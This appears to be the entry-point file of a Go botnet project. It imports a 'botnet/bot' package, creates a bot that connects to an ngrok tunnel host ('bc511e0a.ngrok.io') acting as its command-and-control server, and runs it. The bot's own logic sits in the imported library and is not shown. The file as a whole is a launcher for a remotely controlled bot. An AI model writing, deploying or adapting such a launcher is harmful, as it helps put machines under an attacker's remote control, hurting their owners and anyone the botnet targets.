package main

import (
	"log"

	"github.com/adrianosela/botnet/bot"
)

func main() {
	b, err := bot.NewBot("bc511e0a.ngrok.io")
	if err != nil {
		log.Fatal(err)
	}
	b.Run()
}
